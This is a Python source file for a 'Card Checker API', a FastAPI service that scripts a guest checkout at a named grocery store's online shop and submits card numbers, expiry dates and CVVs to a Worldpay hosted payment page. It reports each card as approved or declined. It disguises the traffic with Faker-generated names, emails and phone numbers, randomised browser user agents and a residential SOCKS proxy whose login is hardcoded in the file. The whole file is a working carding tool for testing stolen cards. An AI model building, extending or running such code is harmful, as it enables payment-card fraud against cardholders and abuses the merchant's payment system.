import asyncio
import json
import re
import time
from functools import wraps
from pathlib import Path
from typing import Optional, Tuple
import os

import httpx
from bs4 import BeautifulSoup, Tag
from fake_useragent import FakeUserAgent
from faker import Faker
from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import JSONResponse
import uvicorn

app = FastAPI(title="Card Checker API", version="1.0.0")

PROXY = "geo.spyderproxy.com:32325:cBYTJIAcgE:yhajRdMWUg_country-us"
SESSION_CACHE_FILE = "session_cache.json"

class SessionCache:
    """Manages session data for reuse across multiple card checks"""

    def __init__(self, cache_file=SESSION_CACHE_FILE):
        self.cache_file = cache_file
        self.sessions = {}
        self.load_cache()

    def load_cache(self):
        """Load cached sessions from file if exists"""
        if Path(self.cache_file).exists():
            try:
                with open(self.cache_file, "r") as f:
                    self.sessions = json.load(f)
                print(f"[CACHE] Loaded {len(self.sessions)} cached sessions")
            except Exception as e:
                print(f"[CACHE] Error loading cache: {e}")
                self.sessions = {}

    def save_cache(self):
        """Save current sessions to file"""
        try:
            with open(self.cache_file, "w") as f:
                json.dump(self.sessions, f, indent=2)
            print(f"[CACHE] Saved {len(self.sessions)} sessions to cache")
        except Exception as e:
            print(f"[CACHE] Error saving cache: {e}")

    def get_session(self, store_id=1021):
        """Get cached session for a specific store"""
        store_key = str(store_id)
        if store_key in self.sessions:
            session = self.sessions[store_key]
            # Check if session is still valid (less than 30 minutes old)
            if time.time() - session.get("timestamp", 0) < 1800:
                print("[CACHE] Using cached session")
                return session
            else:
                print("[CACHE] Cached session expired")
                del self.sessions[store_key]
        return None

    def save_session(self, store_id, session_data):
        """Save session data for reuse"""
        store_key = str(store_id)
        session_data["timestamp"] = time.time()
        self.sessions[store_key] = session_data
        self.save_cache()
        print("[CACHE] Session saved for reuse")

def parse_card(card: str) -> Tuple[str, str, str, str]:
    try:
        card_number, exp_month, exp_year, cvv = re.findall(r"\d+", card)[:4]
        return card_number, exp_month, exp_year, cvv
    except (IndexError, ValueError):
        raise ValueError(
            "Card format is incorrect. Expected format: card_number|exp_month|exp_year|cvv"
        )

def retry_request(attempts=3, delay=2, exceptions=(Exception,)):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            last_exception = exceptions
            for attempt in range(1, attempts + 1):
                try:
                    return await func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    print(f"[RETRY] RETRYING LAST REQUEST... {attempt}/{attempts}")
                    if attempt < attempts:
                        await asyncio.sleep(delay)
            raise last_exception
        return wrapper
    return decorator

async def request_with_retry(session_method, *args, **kwargs):
    retryable = retry_request(
        attempts=3, delay=1, exceptions=(httpx.TimeoutException, httpx.ConnectError)
    )(session_method)
    return await retryable(*args, **kwargs)

def get_proxy_config():
    """Get proxy configuration"""
    proxy_parts = PROXY.split(":")
    proxy = proxy_parts[0]
    port = proxy_parts[1]
    username = proxy_parts[2]
    password = proxy_parts[3]
    return f"socks5://{username}:{password}@{proxy}:{port}"

async def worldpay_auth_with_cache(card: str, use_cache=True):
    card_number, exp_month, exp_year, cvv = parse_card(card)
    session_cache = SessionCache()
    cached_session = session_cache.get_session() if use_cache else None

    if cached_session:
        result = await verify_card_with_cached_session(
            card_number, exp_month, exp_year, cvv, cached_session
        )
        if result:
            return result

    result = await worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache)
    return result

async def verify_card_with_cached_session(
    card_number, exp_month, exp_year, cvv, cached_session
):
    user_agent = cached_session["user_agent"]
    transaction_id = cached_session["transaction_id"]
    viewstate = cached_session["viewstate"]
    viewstategenerator = cached_session["viewstategenerator"]
    eventvalidation = cached_session["eventvalidation"]
    cookies = cached_session.get("cookies", {})

    print("[CACHE] Using cached session for quick verification")

    proxy_config = get_proxy_config()

    async with httpx.AsyncClient(
        proxies={"all://": proxy_config},
        cookies=cookies,
        timeout=httpx.Timeout(10.0)
    ) as client:
        try:
            resp = await request_with_retry(
                client.post,
                f"https://transaction.hostedpayments.com/?TransactionSetupId={transaction_id}",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "dnt": "1",
                    "origin": "https://transaction.hostedpayments.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": f"https://transaction.hostedpayments.com/?TransactionSetupId={transaction_id}",
                    "user-agent": user_agent,
                    "x-microsoftajax": "Delta=true",
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "scriptManager": "upFormHP|processTransactionButton",
                    "__EVENTTARGET": "processTransactionButton",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__VIEWSTATEENCRYPTED": "",
                    "__EVENTVALIDATION": eventvalidation,
                    "hdnCancelled": "",
                    "errorParms": "",
                    "eventPublishTarget": "",
                    "cardNumber": card_number,
                    "ddlExpirationMonth": exp_month.zfill(2),
                    "ddlExpirationYear": (
                        exp_year if len(exp_year) == 2 else exp_year[-2:]
                    ),
                    "CVV": cvv.zfill(3),
                    "hdnSwipe": "",
                    "hdnTruncatedCardNumber": "",
                    "hdnValidatingSwipeForUseDefault": "",
                    "hdnEncoded": "",
                    "__ASYNCPOST": "true",
                    "": "",
                },
            )

            if resp.status_code != 200:
                print(f"[FAST ERROR] Request failed with status code: {resp.status_code}")
                print("[FAST] Falling back to full flow...")
                return None

            soup = BeautifulSoup(resp.text, "html.parser")
            error_span = soup.find("span", class_="error")
            if error_span:
                error_text = error_span.get_text()
                error_message = (
                    error_text.split(": ", 1)[1] if ": " in error_text else error_text
                )
                if "CVV2" in error_message:
                    return "approved", error_message
                else:
                    return "declined", error_message
            else:
                return "approved", "Card added successfully."

        except Exception as e:
            print(f"[FAST ERROR] Failed to use cached session: {e}")
            return None

async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
    user_agent = FakeUserAgent(os=["Windows"]).chrome
    fake_us = Faker(locale="en_US")
    first_name = fake_us.first_name()
    last_name = fake_us.last_name()
    phone = fake_us.numerify("$0%%#$####")
    email = f"{first_name.lower()}{last_name.lower()}{fake_us.random_number(digits=3)}@{fake_us.free_email_domain()}"

    req_num = 0
    proxy_config = get_proxy_config()

    async with httpx.AsyncClient(
        proxies={"all://": proxy_config},
        timeout=httpx.Timeout(15.0)
    ) as client:
        try:
            # REQ 1: POST to get cart_id
            req_num = 1
            resp = await request_with_retry(
                client.post,
                "https://production-us-1.noq-servers.net/api/v1/application/carts",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://shop.jimssupervalu.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "user-agent": user_agent,
                    "x-app-environment": "browser",
                    "x-app-version": "v4.13.1",
                },
                json={
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "FulfillmentSubTotal": 0,
                    "AllowUnattendedDelivery": False,
                    "IsEligibleForFreeDelivery": False,
                    "IsEligibleForFreePickup": False,
                    "IsFulfillmentTaxed": False,
                    "IsGuest": True,
                    "IsOfflinePayment": False,
                    "PaymentSourceId": None,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": None,
                    "StoreId": 1021,
                    "TimeSlot": None,
                    "GiftMessage": None,
                    "EnabledPaymentTypes": [],
                    "Version": 0,
                    "IsTipLimited": False,
                    "VoucherTotal": 0,
                    "HasDeals": False,
                    "AllowAdditionalAuth": False,
                    "Reference": "",
                    "BagAllowance": 0,
                    "CostPlusAmount": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "GrandTotal": 0,
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": "CreditCard",
                    "ContainsAlcohol": False,
                    "ContainsTobacco": False,
                    "IsOverMaxSpend": False,
                    "LoyaltyMembershipNumber": "",
                    "OrderedSubTotal": 0,
                    "PickingAllowanceVariationAmount": 0,
                    "Recipient": None,
                    "TaxIncluded": False,
                    "TaxTotal": 0,
                    "FixedTaxTotal": 0,
                    "TippingAmount": 0,
                    "TippingPercentage": 0,
                },
            )

            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            resp_json = resp.json()
            cart_id = resp_json.get("Result").get("Reference")

            # REQ 2: PUT to add object to cart
            req_num = 2
            resp = await request_with_retry(
                client.put,
                f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}/update-items",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://shop.jimssupervalu.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "user-agent": user_agent,
                    "x-app-environment": "browser",
                    "x-app-version": "v4.13.1",
                },
                json=[
                    {
                        "Reference": "",
                        "ProductId": "c14098c3-b24b-4e95-8bcb-b18d01151836",
                        "CartItemId": "94a066e6-036f-46a5-b128-ea0f007829fa",
                        "OrderedQuantity": 1,
                        "Note": "",
                        "CanSubstitute": True,
                        "FrequencyWeeks": None,
                        "RecurringOrderId": None,
                        "ProductOptions": [],
                        "ShippingAddress": None,
                        "Instructions": None,
                        "GiftMessage": None,
                        "IsProductMissing": False,
                        "Origin": None,
                        "OriginId": None,
                        "RequestedProductName": "",
                        "IsWeighted": False,
                        "PricePerUnit": 0,
                        "PreferredSubstitutionIds": [],
                    }
                ],
            )

            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            # REQ 3: GET to get timeslots
            req_num = 3
            resp = await request_with_retry(
                client.get,
                "https://production-us-1.noq-servers.net/api/v1/application/stores/1021/timeslots",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://shop.jimssupervalu.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "user-agent": user_agent,
                    "x-app-environment": "browser",
                    "x-app-version": "v4.13.1",
                },
                json={
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "AllowUnattendedDelivery": False,
                    "IsEligibleForFreeDelivery": False,
                    "IsEligibleForFreePickup": False,
                    "IsFulfillmentTaxed": False,
                    "IsGuest": True,
                    "IsOfflinePayment": False,
                    "PaymentSourceId": None,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": None,
                    "StoreId": 1021,
                    "TimeSlot": {
                        "Start": "2025-08-29T15:00:00-05:00",
                        "Id": "77555877-3fd1-43f0-a719-b18d014a7f95",
                    },
                    "GiftMessage": None,
                    "EnabledPaymentTypes": [
                        {"Type": "CreditCard", "IsAllowed": True, "Reason": ""}
                    ],
                    "Version": 2,
                    "IsTipLimited": False,
                    "HasDeals": False,
                    "AllowAdditionalAuth": False,
                    "Reference": cart_id,
                    "BagAllowance": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": None,
                    "ContainsAlcohol": False,
                    "ContainsTobacco": False,
                    "IsOverMaxSpend": False,
                    "LoyaltyMembershipNumber": "",
                    "Recipient": None,
                    "TaxIncluded": False,
                    "TippingPercentage": 0,
                },
            )

            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            id_value = None
            start_value = None
            open_slot = next(
                (
                    slot
                    for location in resp.json()
                    .get("Result", {})
                    .get("PickupLocations", [])
                    if location.get("Id") == 1986
                    for slot in location.get("TimeSlots", [])
                    if slot.get("Availability") == "Open"
                ),
                None,
            )

            if open_slot:
                id_value = open_slot.get("Id")
                start_value = open_slot.get("Start")

            if not id_value or not start_value:
                print(f"[REQ {req_num} ERROR] No open timeslots available.")
                return "error", "No open timeslots available"

            # REQ 4: PUT timeslot
            req_num = 4
            resp = await request_with_retry(
                client.put,
                f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://shop.jimssupervalu.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "user-agent": user_agent,
                    "x-app-environment": "browser",
                    "x-app-version": "v4.13.1",
                },
                json={
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "AllowUnattendedDelivery": False,
                    "IsEligibleForFreeDelivery": False,
                    "IsEligibleForFreePickup": False,
                    "IsFulfillmentTaxed": False,
                    "IsGuest": True,
                    "IsOfflinePayment": False,
                    "PaymentSourceId": None,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": None,
                    "StoreId": 1021,
                    "TimeSlot": {
                        "Start": start_value,
                        "Id": id_value,
                    },
                    "GiftMessage": None,
                    "EnabledPaymentTypes": [
                        {"Type": "CreditCard", "IsAllowed": True, "Reason": ""}
                    ],
                    "Version": 2,
                    "IsTipLimited": False,
                    "HasDeals": False,
                    "AllowAdditionalAuth": False,
                    "Reference": cart_id,
                    "BagAllowance": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": None,
                    "ContainsAlcohol": False,
                    "ContainsTobacco": False,
                    "IsOverMaxSpend": False,
                    "LoyaltyMembershipNumber": "",
                    "Recipient": None,
                    "TaxIncluded": False,
                    "TippingPercentage": 0,
                },
            )

            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            # REQ 5: PUT to set name, email and phone
            req_num = 5
            resp = await request_with_retry(
                client.put,
                f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://shop.jimssupervalu.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "user-agent": user_agent,
                    "x-app-environment": "browser",
                    "x-app-version": "v4.13.1",
                },
                json={
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "FulfillmentSubTotal": 15,
                    "AllowUnattendedDelivery": False,
                    "IsEligibleForFreeDelivery": False,
                    "IsEligibleForFreePickup": False,
                    "IsFulfillmentTaxed": False,
                    "IsGuest": True,
                    "IsOfflinePayment": False,
                    "PaymentSourceId": None,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": None,
                    "StoreId": 1021,
                    "TimeSlot": {
                        "Start": start_value,
                        "Id": id_value,
                    },
                    "GiftMessage": None,
                    "EnabledPaymentTypes": [
                        {"Type": "CreditCard", "IsAllowed": True, "Reason": ""}
                    ],
                    "Version": 3,
                    "IsTipLimited": False,
                    "VoucherTotal": 0,
                    "HasDeals": False,
                    "AllowAdditionalAuth": False,
                    "Reference": cart_id,
                    "BagAllowance": 0,
                    "CostPlusAmount": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "GrandTotal": 16.2,
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": None,
                    "ContainsAlcohol": False,
                    "ContainsTobacco": False,
                    "IsOverMaxSpend": False,
                    "LoyaltyMembershipNumber": "",
                    "OrderedSubTotal": 1,
                    "PickingAllowanceVariationAmount": 0.2,
                    "Recipient": {
                        "CustomerId": 0,
                        "FirstName": first_name,
                        "LastName": last_name,
                        "Email": email,
                        "Phone": phone,
                    },
                    "TaxIncluded": False,
                    "TaxTotal": 0,
                    "FixedTaxTotal": 0,
                    "TippingAmount": 0,
                    "TippingPercentage": 0,
                },
            )

            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            customer_id = (
                resp.json().get("Result", {}).get("Recipient", {}).get("CustomerId", {})
            )

            if customer_id is None:
                print(f"[REQ {req_num} ERROR] CustomerId not found")
                return "error", "CustomerId not found"

            # REQ 6: PUT to solve all errors
            req_num = 6
            resp = await request_with_retry(
                client.put,
                f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://shop.jimssupervalu.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "user-agent": user_agent,
                    "x-app-environment": "browser",
                    "x-app-version": "v4.13.1",
                },
                json={
                    "DeliveryDistance": 0,
                    "DeliveryStreetAddress": "",
                    "FulfillmentSubTotal": 15,
                    "AllowUnattendedDelivery": False,
                    "IsEligibleForFreeDelivery": False,
                    "IsEligibleForFreePickup": False,
                    "IsFulfillmentTaxed": False,
                    "IsGuest": True,
                    "IsOfflinePayment": False,
                    "PaymentSourceId": None,
                    "FulfillmentAreaId": 1986,
                    "ShippingAddress": None,
                    "StoreId": 1021,
                    "TimeSlot": {
                        "Start": start_value,
                        "Id": id_value,
                    },
                    "GiftMessage": None,
                    "EnabledPaymentTypes": [
                        {"Type": "CreditCard", "IsAllowed": True, "Reason": ""}
                    ],
                    "Version": 4,
                    "IsTipLimited": False,
                    "VoucherTotal": 0,
                    "HasDeals": False,
                    "AllowAdditionalAuth": False,
                    "Reference": cart_id,
                    "BagAllowance": 0,
                    "CostPlusAmount": 0,
                    "Deposit": 0,
                    "FulfillmentMethod": "Pickup",
                    "GrandTotal": 16.2,
                    "MaxSnapAmount": 0,
                    "PayWithSnapAmount": 0,
                    "Instructions": "",
                    "PaymentType": "CreditCard",
                    "ContainsAlcohol": False,
                    "ContainsTobacco": False,
                    "IsOverMaxSpend": False,
                    "LoyaltyMembershipNumber": "",
                    "OrderedSubTotal": 1,
                    "PickingAllowanceVariationAmount": 0.2,
                    "Recipient": {
                        "CustomerId": customer_id,
                        "FirstName": first_name,
                        "LastName": last_name,
                        "Email": email,
                        "Phone": phone,
                    },
                    "TaxIncluded": False,
                    "TaxTotal": 0,
                    "FixedTaxTotal": 0,
                    "TippingAmount": 0,
                    "TippingPercentage": 0,
                },
            )

            if resp.status_code != 200:
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            # REQ 7: POST to get transaction ID
            req_num = 7
            resp = await request_with_retry(
                client.post,
                "https://production-us-1.noq-servers.net/api/v1/application/customer/worldpay-payment-transaction-session",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "dnt": "1",
                    "origin": "https://shop.jimssupervalu.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "user-agent": user_agent,
                    "x-app-environment": "browser",
                    "x-app-version": "v4.13.1",
                },
                json={
                    "storeId": 1021,
                    "customerId": customer_id,
                    "cartReference": cart_id,
                    "submitButtonText": "Next",
                    "returnUrl": "https://shop.jimssupervalu.com/assets/savecard-worldpay.html#",
                    "css": "body{background-color:#ffffff;color:#5d5d5d;  font-family:sans-serif!important;  font-size:14px;margin:0;padding-top:7px;}  .divMainForm{min-width:300px!important;padding-top:0px!important;padding-right:0px!important;padding-bottom:0px!important;padding-left:0px!important;}#tableMainForm{border:0;border-collapse:collapse;}#tableCardInformation{border:0;border-collapse:collapse;}#tableManualEntry{border:0;border-collapse:collapse;}#tableTransactionButtons{border:0;border-collapse:collapse;}#tdTransactionButtons{border:0;}  #trTransactionInformation{display:none;}.content{border:0;  padding-top:0px!important;padding-right:0px!important;padding-bottom:0px!important;padding-left:0px!important;}.progressMessage{display:none;}.progressImage{width:50px;height:50px;}  .error{color:#d16262!important;}  .required{display:none;}    .tableErrorMessage{background-color:#fdfadb!important;border-collapse:collapse;border-color:#e3e4e6!important;border-radius:2px!important;border-style:solid;border-width:1px!important;color:inherit!important;font-size:14px!important;font-weight:500!important;margin-bottom:16px!important;  }  .tableTdErrorMessage{background-color:transparent;border-collapse:collapse;padding-bottom:16px!important;padding-left:24px!important;padding-right:24px!important;padding-top:16px!important;}  .tdHeader{display:none;}  .tdLabel{display:block;font-weight:600;line-height:1.5;padding-right:0.5em;text-align:left;}.tdField{display:block;line-height:1.5;padding-bottom:12px;}.inputText{background-color:white;border-color:rgba(0,0,0,0.1);border-radius:2px;box-shadow:none;color:#5d5d5d;font-size:14px;padding-bottom:12px;padding-left:12px;padding-right:12px;padding-top:12px;}  .selectOption{background-color:white;border-color:rgba(0,0,0,0.1);border-radius:2px;box-shadow:none;color:#5d5d5d;font-family:inherit;font-size:14px;line-height:normal;margin:0;}#ddlExpirationMonth{display:inline-block;min-width:6em;padding:8px;}#ddlExpirationYear{display:inline-block;min-width:6em;padding:8px;}    .tdTransactionButtons{line-height:0;}  #submit:link{background-color:#c01e16!important;color:#ffffff!important;border-radius:2px;border:0!important;cursor:pointer!important;display:block!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}#tempButton:link{background-color:green!important;color:white!important;border-radius:2px!important;border:0!important;cursor:pointer!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}#btnCancel:link{background-color:#616161!important;color:white!important;border-radius:2px!important;border:0!important;cursor:pointer!important;display:block!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}",
                    "bd": "1756267583677.EWWClv",
                },
            )

            if resp.status_code != 200:
                print(resp.text)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            transaction_id = resp.json().get("Result", {})

            # REQ 8: GET to get viewstate, viewstategenerator and eventvalidation
            req_num = 8
            resp = await request_with_retry(
                client.get,
                f"https://transaction.hostedpayments.com/?TransactionSetupId={transaction_id}",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "priority": "u=0, i",
                    "referer": "https://shop.jimssupervalu.com/",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
            )

            if resp.status_code != 200:
                print(resp.text)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            soup = BeautifulSoup(resp.text, "html.parser")

            viewstate = soup.find("input", {"name": "__VIEWSTATE"})
            if viewstate and isinstance(viewstate, Tag):
                viewstate = viewstate.get("value", "")

            viewstategenerator = soup.find("input", {"name": "__VIEWSTATEGENERATOR"})
            if viewstategenerator and isinstance(viewstategenerator, Tag):
                viewstategenerator = viewstategenerator.get("value", "")

            eventvalidation = soup.find("input", {"name": "__EVENTVALIDATION"})
            if eventvalidation and isinstance(eventvalidation, Tag):
                eventvalidation = eventvalidation.get("value", "")

            session_data = {
                "user_agent": user_agent,
                "transaction_id": transaction_id,
                "viewstate": viewstate,
                "viewstategenerator": viewstategenerator,
                "eventvalidation": eventvalidation,
                "cookies": dict(client.cookies),
                "cart_id": cart_id,
                "customer_id": customer_id,
            }

            session_cache.save_session(1021, session_data)

            # REQ 9: POST to verify card
            req_num = 9
            resp = await request_with_retry(
                client.post,
                f"https://transaction.hostedpayments.com/?TransactionSetupId={transaction_id}",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "dnt": "1",
                    "origin": "https://transaction.hostedpayments.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://transaction.hostedpayments.com/?TransactionSetupId=750FE01C-E533-4483-8C43-A0370BFE6C1F",
                    "user-agent": user_agent,
                    "x-microsoftajax": "Delta=true",
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "scriptManager": "upFormHP|processTransactionButton",
                    "__EVENTTARGET": "processTransactionButton",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__VIEWSTATEENCRYPTED": "",
                    "__EVENTVALIDATION": eventvalidation,
                    "hdnCancelled": "",
                    "errorParms": "",
                    "eventPublishTarget": "",
                    "cardNumber": card_number,
                    "ddlExpirationMonth": exp_month.zfill(2),
                    "ddlExpirationYear": (
                        exp_year if len(exp_year) == 2 else exp_year[-2:]
                    ),
                    "CVV": cvv.zfill(3),
                    "hdnSwipe": "",
                    "hdnTruncatedCardNumber": "",
                    "hdnValidatingSwipeForUseDefault": "",
                    "hdnEncoded": "",
                    "__ASYNCPOST": "true",
                    "": "",
                },
            )

            if resp.status_code != 200:
                print(resp.text)
                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                return "error", f"Request {req_num} failed"

            soup = BeautifulSoup(resp.text, "html.parser")
            error_span = soup.find("span", class_="error")
            if error_span:
                error_text = error_span.get_text()
                error_message = (
                    error_text.split(": ", 1)[1] if ": " in error_text else error_text
                )
                if "CVV2" in error_message:
                    return "approved", error_message
                else:
                    return "declined", error_message
            else:
                return "approved", "Card added successfully."

        except Exception as e:
            print(f"[REQ {req_num} ERROR] An error occurred: {e}")
            return "error", str(e)

# API Endpoints
@app.get("/")
async def root():
    return {
        "message": "Card Checker API", 
        "version": "1.0.0", 
        "usage": "GET /?cc=card_number|exp_month|exp_year|cvv",
        "status": "online"
    }

@app.get("/check")
async def check_card(cc: str = Query(..., description="Card data in format: card_number|exp_month|exp_year|cvv")):
    try:
        # Validate card format
        if not cc or "|" not in cc:
            raise HTTPException(
                status_code=400, 
                detail="Invalid card format. Use: card_number|exp_month|exp_year|cvv"
            )
        
        print(f"[API] Checking card: {cc}")
        
        # Check card using cached session first, then full flow if needed
        result = await worldpay_auth_with_cache(cc, use_cache=True)
        
        if result is None:
            print("[API] Retrying with full flow...")
            result = await worldpay_auth_with_cache(cc, use_cache=False)
        
        if result:
            status, message = result
            return JSONResponse({
                "success": True,
                "card": cc,
                "status": status.upper(),
                "message": message,
                "timestamp": int(time.time())
            })
        else:
            return JSONResponse({
                "success": False,
                "card": cc,
                "status": "ERROR",
                "message": "Failed to process card",
                "timestamp": int(time.time())
            }, status_code=500)
            
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except Exception as e:
        print(f"[API ERROR] {e}")
        return JSONResponse({
            "success": False,
            "card": cc,
            "status": "ERROR", 
            "message": str(e),
            "timestamp": int(time.time())
        }, status_code=500)

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": int(time.time())}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    print("Starting Card Checker API...")
    print(f"Usage: GET /?cc=4111111111111111|12|25|123")
    print(f"       GET /check?cc=4111111111111111|12|25|123")
    uvicorn.run(app, host="0.0.0.0", port=port)
